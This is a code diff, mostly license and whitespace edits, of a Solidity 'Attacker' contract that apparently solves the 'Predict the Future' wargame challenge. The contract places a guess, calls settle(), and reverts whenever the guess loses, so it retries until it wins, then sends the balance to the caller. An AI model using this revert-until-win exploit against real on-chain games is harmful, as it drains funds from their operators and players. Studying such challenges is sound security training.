@@ -1,11 +1,10 @@
-// SPDX-License-Identifier: GPL-3.0-or-later
+// SPDX-License-Identifier: MIT
 
 pragma solidity ^0.8.19;
 
 contract Attacker {
     address owner;
     IPredictTheFutureChallenge challenge;
-
 
     error NotOwner();
     error ValueErr();
@@ -19,21 +18,21 @@ contract Attacker {
     function lockInGuess(uint8 n) external payable {
         if (msg.sender != owner) revert NotOwner();
         if (address(this).balance < 1 ether) revert ValueErr();
-        
+
         challenge.lockInGuess{value: 1 ether}(n);
     }
-    
+
     function attack() external {
         if (msg.sender != owner) revert NotOwner();
 
         challenge.settle();
-    
+
         // if we guessed wrong, revert
         if (!challenge.isComplete()) revert GuessErr();
         // return all of it to EOA
         payable(tx.origin).transfer(address(this).balance);
     }
-    
+
     receive() external payable {}
 }
 
